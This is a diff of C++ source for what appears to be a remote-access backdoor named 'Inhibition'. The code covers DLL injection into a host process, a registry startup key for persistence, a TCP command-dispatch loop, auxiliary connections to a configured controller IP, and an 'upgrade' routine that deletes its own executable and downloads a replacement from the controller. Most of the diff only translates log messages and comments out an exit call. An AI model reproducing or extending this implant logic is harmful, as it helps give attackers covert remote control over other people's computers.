@@ -78,8 +78,11 @@ namespace Inhibition
         // libération des ressources
         clean();
         
+		// TODO : exit ne tue pas le processus hote si celui ci a été démarré par COM
         // cet appel va fermer le le processus injecté et décharger la DLL
-        std::exit(0);
+        // std::exit(0);
+		
+
         return true;
     }
 
@@ -92,24 +95,19 @@ namespace Inhibition
     {
 		/*
         TcpClient aux;
-        LOG << "Tentative de connexion auxiliaire.";
         if(aux.connect(cinfo.ip, cinfo.port))
         {
             if(auth.authentificate(aux))
             {
-                LOG << "Envoi de l'ID " + to_string(session.get_id());
                 aux.send(to_string(session.get_id())+'\n');
-                LOG << "Connexion auxiliaire acquise.";
                 session.push_stream(aux);
                 return true;
             }
             else
             {
-                LOG << "Echec de l'authentification.";
                 aux.reset();
             }
         }
-        LOG << "Connexion auxiliaire NON acquise.";
 		*/
         return false;
     }
@@ -127,7 +125,7 @@ namespace Inhibition
 
     void InhibitionCoreImpl::disconnect()
     {
-        LOG << "Deconnection...";
+        LOG << "Disconnecting";
         // on nettoie a la fois la connexion principale et les connexions auxiliaire
         session.setId(0);
         session.reset();
@@ -136,16 +134,16 @@ namespace Inhibition
     bool InhibitionCoreImpl::process_command()
     {
 		string buffer_cmd;
-        LOG << "En attente d'une commande : ";
+        LOG << "Waiting command : ";
         session >> buffer_cmd;
         if(dispatcher.find(buffer_cmd))
         {
-            LOG << "Commande recue : " + buffer_cmd;
+            LOG << "Command known : " + buffer_cmd;
             dispatcher.dispatch(buffer_cmd);
         }
         else
         {
-            LOG << "Commande inconnue : " + buffer_cmd;
+            LOG << "Command unknown : " + buffer_cmd;
             return false;
         }
         return true;
@@ -153,9 +151,9 @@ namespace Inhibition
 
     bool InhibitionCoreImpl::uninstall()
     {
-        LOG << "Desinstallation de la cle de registre.";
+        LOG << "Removing registry key";
         startup->uninstall();
-        LOG << "Lancement du desinstallateur.";
+        LOG << "Launching uninstaller";
         Process uninstaller(getInstallPath(), UNINSTALL_CMD);		
         exit();
         return true;
@@ -163,17 +161,14 @@ namespace Inhibition
 
     void InhibitionCoreImpl::upgrade()
     {
-        LOG << "Efface l'ancien executable.";
+        LOG << "Upgrading executable";
         if(!DeleteFile(getInstallPath().c_str()))
         {
-            LOG << "Impossible d'effacer l'executable a mettre a jour.";
+            LOG << "DeleteFile failed : "+to_string(GetLastError());
             session << FAILURE;
             return;
-            
         }
         session << SUCCESS;
-
-        // téléchargement du nouvel executable
         Download download(getInstallPath(), session.stream());
         download.launch();
     }
